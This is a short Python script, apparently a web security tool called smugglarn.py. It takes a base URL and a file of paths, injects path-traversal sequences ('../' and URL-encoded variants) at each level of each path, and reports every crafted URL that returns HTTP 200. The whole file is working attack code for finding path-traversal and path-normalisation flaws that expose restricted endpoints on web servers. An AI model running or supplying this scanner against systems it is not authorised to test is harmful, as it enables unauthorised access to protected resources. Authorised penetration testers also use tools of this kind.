#!/usr/bin/python3
import requests, sys, getopt, os.path

travenc = ["../", "%2e./", ".%2e/", "%2e.%2f", ".%2e%2f", "..%2f", "%2e%2e%2f"]

def send_requests_per_path(base, path, enp):
    path_comp = path.split('/')[1:]
    org_req = requests.get(base+path[1:])
    org_resp_code = org_req.status_code

    for inj_point in range(len(path_comp)):
        for trav in travenc:
            traversal = trav*(inj_point+1)
            probe = ''
            if enp == '':
                probe = path[1:]
            else:
                probe = enp[1:]
            
            url=base+'/'.join(path_comp[:inj_point+1])+'/'+traversal+probe
            r = requests.get(url)
            if r.status_code == 200:
                print(str(r.status_code) + ": " + url)

def print_help():
    help_text = '''Usage: smugglarn.py -u <base_url> -p <paths_file> [-e <probing_endpoint>]'''
    print(help_text)

def main(argv):
    baseurl = ''
    endpoint = ''
    paths_file = ''
    try:
        opts, args = getopt.getopt(argv,"hu:p:e:")
    except getopt.GetoptError:
        print_help()
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print_help()
        elif opt == '-u':
            baseurl = arg
        elif opt == '-p':
            paths_file = arg
            if not os.path.exists(paths_file):
                print("File not found: " + paths_file)
                sys.exit(2)
        elif opt == '-e':
            endpoint = arg

    if baseurl == '' or paths_file == '':
        print_help()
        sys.exit(2)

    pf = open(paths_file)
    for line in pf:
        send_requests_per_path(baseurl, line[:-1], endpoint)
    

if __name__ == "__main__":
    main(sys.argv[1:])

